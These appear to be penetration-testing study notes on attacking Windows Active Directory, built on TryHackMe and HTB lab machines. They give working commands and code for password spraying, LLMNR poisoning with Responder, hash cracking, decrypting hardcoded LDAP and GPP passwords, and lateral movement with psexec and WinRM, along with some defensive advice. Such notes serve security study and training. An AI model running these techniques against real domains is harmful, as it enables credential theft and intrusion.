# Active Directory

Active Directory (AD) is Microsoft's directory service for managing identity and access across a Windows domain — every user, computer, group, and permission in the network lives in it. Because it holds "the keys to the kingdom," it's one of the highest-value targets in a Windows engagement.

!!! note "Facts"
    - Active Directory is used by roughly 90% of the Global Fortune 1000 companies.
    - Since AD handles Identity and Access Management for the entire estate, compromising it usually means compromising everything else on the network too.

## Physical components

- **Domain Controller (DC):** the server that performs authentication and authorization, replicates updates to other domain controllers, and allows administrative access to manage user accounts and network resources.
- **AD DS (Active Directory Domain Services):** the database backing AD, stored in the `Ntds.dit` file, located by default in `%SystemRoot%\NTDS` on every domain controller.

## Logical components

- **Schema:** defines every type of object that can be stored in the directory and enforces the rules for creating/configuring those objects.
- **Domains:** used to group and manage objects in an organization; a domain can be an administrative boundary for applying policies to groups of objects.
- **Trees:** a domain tree is a hierarchy of domains in AD DS that share a contiguous namespace with the parent domain.
- **Forest:** a collection of one or more domain trees that share a common schema, configuration partition, and global catalog (for searching across the forest).
- **Trusts:** the mechanism that lets users in one domain gain access to resources in another domain.

## Enumeration

The point of enumeration is simple: before you can attack a domain, you need to know who and what is in it — users, groups, machines, and how they relate. Most of this can be done before you ever run an exploit.

### OSINT

- Check sites like Stack Overflow for employees who may have leaked credentials or internal details in their own questions/answers.
- Check public code repos (e.g. GitHub) for hardcoded credentials or internal configuration accidentally committed by employees.
- Use breach-lookup sites like [HaveIBeenPwned.com](http://HaveIbeenPwned.com) or [Dehashed.com](http://Dehashed.com) to check whether an employee's information has already surfaced in a public breach.

### CMD

The built-in `net` command can enumerate a domain without any extra tooling — useful when you land on a box with nothing else available.

- Enumerate all domain users:

```java
net user /domain
```

- Enumerate details about one user:

```java
net user zoe.marshall /domain
```

- Enumerate domain groups:

```java
net group /domain
```

- Enumerate members of a specific group:

```java
net group "Tier 1 Admins" /domain
```

- Enumerate the domain's password policy (lockout threshold, minimum length, etc.) — this tells you how aggressively you can safely password-spray without locking accounts:

```java
net accounts /domain
```

### PowerShell

The `ActiveDirectory` module gives much richer, structured output than `net`, and is the standard tool once you're operating from a domain-aware context.

- Enumerate a single AD user and every property on it:

```java
Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *
```

- `Identity` — the account name being enumerated.
- `Properties` — which properties to show; `*` shows all of them.
- `Server` — required when the host isn't domain-joined, to point the query at a specific domain controller.

- Search for users matching a name pattern:

```java
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
```

- Enumerate group membership:

```java
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com
```

- Pull general information about the domain itself:

```java
Get-ADDomain -Server za.tryhackme.com
```

### Phishing

- Phishing typically tricks a user into either entering their credentials on a fake login page, or running an application that drops a Remote Access Trojan (RAT) in the background — either way it's a way of skipping straight past technical AD defenses by attacking the human.

### NetBIOS

NetBIOS (Network Basic Input/Output System) is an old IBM API/service set that lets applications on different hosts talk to each other over a LAN. It's still enabled on many Windows networks by default, which makes it a quick and noise-free way to fingerprint hosts before doing anything more active.

- Core `nbtstat` commands:

```shell
nbtstat -a <hostname>   # Lists NetBIOS name table of a remote host
nbtstat -A <IP address> # Lists NetBIOS name table by IP
nbtstat -n              # Displays local NetBIOS names
nbtstat -c              # Shows NetBIOS name cache
nbtstat -R              # Purges and reloads NetBIOS name cache
nbtstat -S              # Lists current NetBIOS sessions
nbtstat -s              # Lists NetBIOS sessions with names
```

- Example: enumerating a specific machine by IP:

```shell
PS C:\Users\Alexis> nbtstat -A 192.168.1.103

Ethernet:
Node IpAddress: [192.168.1.102] Scope Id: []

NetBIOS Remote Machine Name Table

Name                       Type           Status
--------------------------------------------------------
ALEXIS-WORKSTAT<20>        UNIQUE         Registered
ALEXIS-WORKSTAT<00>        UNIQUE         Registered
HACKERSPLOIT               GROUP          Registered
HACKERSPLOIT               UNIQUE         Registered
MSBROWSE                   GROUP          Registered

MAC Address = 1C-66-6D-99-B3-7D
```

!!! tip "Tooling"
    - `nbtscan` does essentially the same job as `nbtstat` — nothing special beyond it.
    - `smbclient` is the most capable tool of the bunch for actually interacting with what NetBIOS/SMB exposes (shares, files) rather than just names.

### BloodHound

- BloodHound is a graphical tool that visually maps out an AD environment's attack paths — users, groups, trusts, sessions, ACLs — as a graph.
- It's normally fed by **SharpHound** (similar in spirit to PowerView), which walks the domain and collects users, groups, trusts, etc. into `.json` files for BloodHound to ingest.

## Breach Active Directory

### NTLM Authenticated Services

NTLM (New Technology LAN Manager) is Microsoft's older suite of authentication protocols. Understanding it matters because a lot of AD attacks (password spraying, relaying) exist specifically because of how NTLM authentication works.

- NTLM is the suite of security protocols used to authenticate a user's identity in AD.
- NetNTLM lets an application sit as a middle-man between the client and AD during authentication — which is exactly the property that authentication-relay attacks (see [Authentication Relays](#authentication-relays) below) abuse.

**Password spraying over NTLM** — trying one password across many usernames (instead of many passwords against one user) avoids account lockouts:

```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

Usage:

```python
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
```

- `<userfile>` — text file of usernames, e.g. `usernames.txt`.
- `<fqdn>` — fully qualified domain name of the target org, e.g. `za.tryhackme.com`.
- `<password>` — the single password being sprayed, e.g. `Changeme123`.
- `<attackurl>` — URL of the application that supports Windows Authentication, e.g. `http://ntlmauth.za.tryhackme.com`.

### LDAP

LDAP (Lightweight Directory Access Protocol) is how applications query AD directly. Unlike NTLM (where AD itself verifies the credential behind the scenes), with LDAP the *application* verifies the user's credentials directly against the directory — so the application has to hold or be given valid directory credentials of its own.

- Applications and systems that commonly authenticate via LDAP: GitLab, Jenkins, custom-developed web apps, printers, VPNs.
- How to recognize LDAP is in use: look for ports 389 (LDAP) or 636 (LDAPS) — a device using either of these, or one configured to authenticate users/manage directory services, is very likely using LDAP.
- Watching LDAP traffic on the wire:

```python
sudo tcpdump -SX -i breachad tcp port 389
```

#### LDAP Bind Credentials

The core problem here: any tool that has to query LDAP for itself (rather than prompting the operator each time) needs a stored credential to bind with — and that credential has to live *somewhere* inside the tool, which makes the tool itself a target.

!!! important "Practical example: decompiling a custom .NET tool for a hardcoded LDAP bind password (HTB `Support`)"
    **In plain terms:** internal IT tools are often little GUI/CLI apps that need to query the directory themselves, so developers bake a service account's password right into the program instead of prompting the operator for one. If you can get a copy of that program, you can pull the password back out of it — the app has to know it, so it's in there somewhere.

    - A null-session-readable SMB share (`support-tools`) held a custom `UserInfo.exe` — an internal helper that looks up AD user info.
    - **Why decompile it:** the `.exe` has to authenticate to LDAP to do its job, so its LDAP bind credentials must exist somewhere inside the binary. Decompiling turns the compiled program back into readable source.

    ```bash
    dotnet tool install --global ilspycmd --version 7.2.1.6295   # pin an older build if the SDK is older than net10
    ilspycmd UserInfo.exe -o decompiled/
    grep -n -iE "password|ldap|decrypt|key" decompiled/UserInfo.decompiled.cs
    ```

    - The decompiled source showed the password stored encrypted, with the decryption logic sitting right next to it:

    ```c#
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");
    // decrypt: base64-decode, then XOR each byte with the key (repeating) and with 0xDF
    ```

    - **Why this "encryption" doesn't actually protect anything:** the key and the algorithm both ship inside the same binary as the ciphertext — everything needed to decrypt the password travels right alongside it, so it's obfuscation, not real security.

    ```bash
    python3 -c "
    import base64
    enc = '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'
    key = b'armando'
    raw = base64.b64decode(enc)
    print(bytes((b ^ key[i % len(key)]) ^ 0xDF for i, b in enumerate(raw)))
    "
    ```

    - Recovered LDAP bind account: `support\ldap`, password decrypted straight from the binary — a full authenticated LDAP bind, starting from a completely unauthenticated position (null SMB session only).
    - **Full chain:** see [Support (custom-tool credential leak + RBCD to Domain Admin)](labs.md#support-custom-tool-credential-leak-rbcd-to-domain-admin) in Labs, and [RBCD via GenericAll on a computer object](privilege-escalation.md#rbcd-via-genericall-on-a-computer-object-support) for what the recovered `ldap` bind unlocked next.

#### LDAP domain dump

```bash
sudo ldapdomaindump ldaps://192.168.138.136 -u 'MAREL\fcastle' -p Password1
```

- `ldapdomaindump` extracts and dumps information from LDAP in bulk once you have any valid bind credential. It dumps domain objects and configuration, including:
    - Domain policies
    - Organizational units (OUs)
    - Users
    - Groups
    - Group memberships
    - Computers

### Authentication Relays

The idea: instead of cracking a captured hash, you capture an authentication attempt and hand it straight to another service as if you were the original user — the victim's own credentials authenticate *for* you, in real time.

- Intercepting hashes off the wire (SMB, in this example):

```python
sudo responder -I breachad
```

- Cracking a captured NetNTLMv2 hash offline with hashcat (mode 5600 = NetNTLMv2):

```python
hashcat -m 5600 <hash file> <password file> --force
```

- Example cracked output:

```python
SVCFILECOPY::ZA:6b568759ddb993d9:a8b067f7a075d501da4435a0b3f7cbb8:0101...:FPassword1!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

#### LLMNR

LLMNR (Link-Local Multicast Name Resolution) is a fallback name-resolution protocol Windows uses when DNS fails to resolve a hostname. Because it's a broadcast/multicast request with no authentication, an attacker on the same network segment can simply answer first and impersonate the requested host — tricking the victim into authenticating to the attacker instead.

- LLMNR-based credential theft is a network attack that exploits this protocol to perform **credential theft via spoofing and relay techniques**.
- Running the attack:

```bash
sudo responder -I eth0 -dwPv
```

!!! warning "Defense"
    Disable LLMNR (and NetBIOS Name Service) via Group Policy wherever DNS resolution is reliable — there's rarely a legitimate reason to leave either enabled on a hardened domain.

### Microsoft Deployment Toolkit

- MDT is usually integrated with Microsoft's System Center Configuration Manager (SCCM), which manages updates for Microsoft applications, services, and operating systems across the estate.
- MDT is used for new deployments — it lets the IT team preconfigure and manage boot images.

**PXE**

- Large organizations use PXE boot to let new devices on the network load and install the OS directly over the network connection, without needing physical install media.

### Configuration Files

No source content beyond the heading in this pass — nothing further to migrate here yet.

### Lateral Movement and Pivoting

Once you have valid credentials for *a* machine, the next question is how far those credentials reach. Windows offers several built-in remote-execution mechanisms — all of them are "legitimate" admin tooling, which is exactly why they're so useful for blending in.

#### Spawning process remotely

##### Psexec

- Psexec has long been the go-to method for executing processes remotely — it lets an administrator run commands on any PC they have access to.
- **Ports:** 445/TCP (SMB)
- **Required group membership:** Administrators

```java
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

##### Windows Remote Management (WinRM)

- WinRM is a web-based protocol for sending PowerShell commands to Windows hosts remotely. Most Windows Server installs have it enabled by default, making it an attractive lateral-movement vector.
- **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
- **Required group membership:** Remote Management Users

- Connecting to a remote PowerShell session from the command line:

```java
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

- Doing the same from PowerShell, passing different credentials via a `PSCredential` object:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

- Opening an interactive session with `Enter-PSSession`:

```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

- Running a script block remotely without an interactive session, via `Invoke-Command`:

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

##### Creating Services Using sc remotely

- Windows services execute a command when started, so a service can be (ab)used to run arbitrary commands — even though a service executable is technically different from a regular application, pointing one at any application will still run it (and then the service will fail afterward, which is expected).
- **Ports:**
    - 135/TCP, 49152-65535/TCP (DCE/RPC)
    - 445/TCP (RPC over SMB Named Pipes)
    - 139/TCP (RPC over SMB Named Pipes)
- **Required group membership:** Administrators

### Group Policy Preferences (GPP) cpassword

The problem in one sentence: Microsoft once let admins push credentials (local accounts, scheduled-task run-as accounts, mapped drives, etc.) through Group Policy XML files, "encrypted" with a key that Microsoft published — so anyone who can read the XML can recover the plaintext password.

- Group Policy historically let admins push local/service credentials via GPP XML (`Groups.xml`, `Drives.xml`, `ScheduledTasks.xml`, `Services.xml`, `DataSources.xml`) stored in the domain's SYSVOL / DFS-R replication share.
- The `cpassword` field is AES-256-CBC "encrypted" — but Microsoft published the static key in the GPP schema documentation, so it decrypts identically for every domain, every time.
- **MS14-025** stopped the GUI from *creating new* GPP credentials, but never retroactively removed ones already deployed — old `Groups.xml` files with live `cpassword` values are still a common find.
- Since domain-joined machines must be able to read GPOs to apply them, SYSVOL/Replication shares are often reachable via anonymous or guest SMB in poorly hardened environments — no credentials needed to find and read the file.

- Enumerate shares and pull the file anonymously:

```bash
smbclient -L //<dc-ip>/ -N
smbclient //<dc-ip>/Replication -N -c 'recurse ON; ls'
```

- Real find — `Groups.xml` under a GPO's `MACHINE\Preferences\Groups`:

```javascript
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User></Groups>
```

- Decrypt with the known static key (`gpp-decrypt` ships this key built in):

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

```javascript
GPPstillStandingStrong2k18
```

- Result: a working domain credential straight from an anonymous share read — `SVC_TGS : GPPstillStandingStrong2k18`.
- **Used in:** the Active box chain (see [Active (GPP cpassword + Kerberoasting to Domain Admin)](labs.md#active-gpp-cpassword-kerberoasting-to-domain-admin)) to bootstrap [Kerberoasting a misconfigured SPN](privilege-escalation.md#kerberoasting-a-misconfigured-spn-privileged-account).

!!! tip "Recommendations"
    - Never store credentials in Group Policy Preferences, full stop — treat any that exist as compromised.
    - Audit SYSVOL/Replication for legacy `cpassword` values (MS14-025 doesn't remove them) and rotate any password ever placed there.
    - Restrict anonymous/guest access to SYSVOL and DFS-R shares where possible; enforce least-privilege read on Group Policy objects.
